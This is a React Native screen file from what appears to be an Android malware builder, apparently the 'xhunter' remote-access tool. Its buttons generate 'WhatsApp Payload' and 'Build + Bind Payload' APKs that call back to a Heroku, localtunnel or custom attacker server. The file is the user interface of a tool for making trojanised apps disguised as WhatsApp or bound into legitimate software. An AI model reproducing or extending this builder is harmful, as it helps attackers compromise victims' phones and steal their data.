import React, { useEffect, useState } from "react";
import { PermissionsAndroid, DeviceEventEmitter } from 'react-native';
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
    Link,
    Badge,
    HStack,
    useToast
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { addBuildPayloadLogs } from '../../redux/slices/userInfo'

// components
import BuildLogScreen from '../../components/BuildLogScreen'

import AppBuilder from '../../native-modules/AppBuilder'
import CustomInput from "../../components/CustomInput";
import CustomInputBind from "../../components/CustomInputBind";

const PayloadOptions = ({navigation}) => {
  const [visible, setVisible]= useState(false);
  const [visible2, setVisible2]= useState(false);
  const [visible3, setVisible3]= useState(false);
  const dispatch = useDispatch();
  const toast = useToast();
  const { subdomain } = useSelector((state) => state.userInfo);

  useEffect(()=>{
   const sub = DeviceEventEmitter.addListener('log', addlog);
   return ()=>{
    sub.remove();
   }
  },[])

  const addlog =( data ) => { 
    let type = Object.keys(data)[0];
    let message= data[type];
    dispatch(addBuildPayloadLogs({ type, message})) 
}
  
  const handleAppBuilder = async (isCustom)=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
      if(isCustom){
        setVisible3(true)
      }else{
        navigation.navigate('payloadBuilder',{url:`https://${subdomain}.loca.lt`})
       }
     }else{
      requestPermission();
     }
    
  }
  const handleBuilder=async(isCustom)=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
       if(isCustom){
        setVisible2(true)
      }else{
         setVisible(true)
         AppBuilder.bindWhatsapp(`https://${subdomain}.loca.lt`)
       }
     }else{
      requestPermission();
     }
  }

  async function requestPermission() 
   { 
     try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
          } 
        } catch (err) { } 
   }
  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} justifyContent={"center"} bg={"primary"} px={'10'} >
    <Link href="https://github.com/anirudhmalik/xhunter-server" isExternal>
    <HStack alignItems="center" mb={2}>
          <Badge colorScheme="darkBlue" _text={{ color: "white"}} variant="solid" rounded="4">
              How to setup heroku server?
           </Badge>
        </HStack>
    </Link>
    <Button variant={'subtle'} onPress={()=>handleBuilder(true)} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'Build WhatsApp Payload (heroku server)'}
    </Button>
    <Button variant={'subtle'} onPress={()=>handleBuilder(false)} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'Build WhatsApp Payload (localtunnel)'}
    </Button>
    <Button variant={'subtle'} onPress={()=>handleBuilder(true)} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'Build WhatsApp Payload (custom server)'}
    </Button>
    <Button onPress={()=>handleAppBuilder(true)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind Payload (heroku server)'}
    </Button>
    <Button onPress={()=>handleAppBuilder(false)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind Payload (localtunnel)'}
    </Button>
    <Button onPress={()=>handleAppBuilder(true)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind Payload (custom server)'}
    </Button>
    </Box>
    <CustomInput visible={visible2} setVisible={setVisible2} setVisibleLog={setVisible}/>
    <CustomInputBind visible={visible3} setVisible={setVisible3} navigation={navigation}/>
    <BuildLogScreen visible={visible} navigation={navigation}/>
    </>
    )
};

export default PayloadOptions;

  